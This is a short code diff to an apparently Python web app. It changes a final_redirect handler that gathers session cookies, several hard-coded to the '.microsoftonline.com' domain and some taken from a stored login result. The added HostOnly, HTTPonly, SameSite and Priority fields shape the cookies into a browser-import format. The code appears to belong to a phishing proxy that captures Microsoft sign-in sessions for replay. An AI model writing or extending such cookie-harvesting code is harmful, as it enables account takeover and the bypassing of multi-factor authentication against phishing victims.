@@ -1205,7 +1205,11 @@ async def final_redirect():
                         "domain": cookie.domain,
                         "path": cookie.path,
                         "secure": cookie.secure,
-                        "expires": cookie.expires if cookie.expires else None
+                        "expires": cookie.expires if cookie.expires else None,
+                        "HostOnly": cookie.domain_specified and not cookie.domain_initial_dot,
+                        "HTTPonly": cookie.has_nonstandard_attr('HttpOnly'),
+                        "SameSite": cookie.has_nonstandard_attr('SameSite'),
+                        "Priority": cookie.has_nonstandard_attr('Priority')
                     })
                 return cookies_list
             except requests.exceptions.RequestException as e:
@@ -1228,9 +1232,14 @@ async def final_redirect():
                         "value": cookie_value,
                         "domain": ".microsoftonline.com",
                         "path": "/",
-                        "secure": True
+                        "secure": True,
+                        "HostOnly": False,
+                        "HTTPonly": False,
+                        "SameSite": False,
+                        "Priority": False
                     })
-            
+                    
+                    
             # Add cookies from login_result if available
             login_result = session.get('login_result', {})
             if login_result and login_result.get('cookies'):
@@ -1276,7 +1285,11 @@ async def final_redirect():
                         "value": cookie_value,
                         "domain": ".microsoftonline.com",
                         "path": "/",
-                        "secure": True
+                        "secure": True,
+                        "HostOnly": False,
+                        "HTTPonly": False,
+                        "SameSite": False,
+                        "Priority": False  
                     })
                     
             # Add cookies from login_result if available
